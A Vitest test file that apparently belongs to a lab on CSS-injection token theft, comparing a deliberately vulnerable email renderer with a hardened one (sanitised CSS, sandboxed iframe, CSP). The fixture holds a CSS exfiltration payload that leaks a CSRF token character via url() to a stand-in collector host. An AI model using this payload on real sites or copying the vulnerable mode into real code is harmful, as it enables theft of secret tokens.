import { describe, it, expect } from "vitest";
import { renderMessage } from "../src/render.js";

const TOKEN = "a1b2c3d4";
const EMAIL_CSS = 'input[name="csrf"][value^="a"]{background-image:url(http://collector:4000/leak?c=a)}';

describe("renderMessage (vulnerable)", () => {
  const { html, headers } = renderMessage({ token: TOKEN, emailCss: EMAIL_CSS, secure: false });

  it("puts the secret token in an input in the trusted document", () => {
    expect(html).toContain(`name="csrf" value="${TOKEN}"`);
  });

  it("injects the attacker CSS raw, url() intact", () => {
    expect(html).toContain("url(http://collector:4000/leak?c=a)");
  });

  it("sends no Content-Security-Policy", () => {
    expect(headers["content-security-policy"]).toBeUndefined();
  });
});

describe("renderMessage (secure)", () => {
  const { html, headers } = renderMessage({ token: TOKEN, emailCss: EMAIL_CSS, secure: true });

  it("sanitizes the email CSS (no url())", () => {
    expect(html).not.toContain("url(");
    expect(html).not.toContain("collector:4000");
  });

  it("renders the untrusted email in a sandboxed iframe", () => {
    expect(html).toMatch(/<iframe[^>]*sandbox/);
  });

  it("keeps the secret out of the iframe that holds attacker CSS", () => {
    const iframe = html.slice(html.indexOf("<iframe"));
    expect(iframe).not.toContain(TOKEN);
  });

  it("sends a CSP that blocks external image loads", () => {
    expect(headers["content-security-policy"]).toContain("img-src 'self'");
  });
});
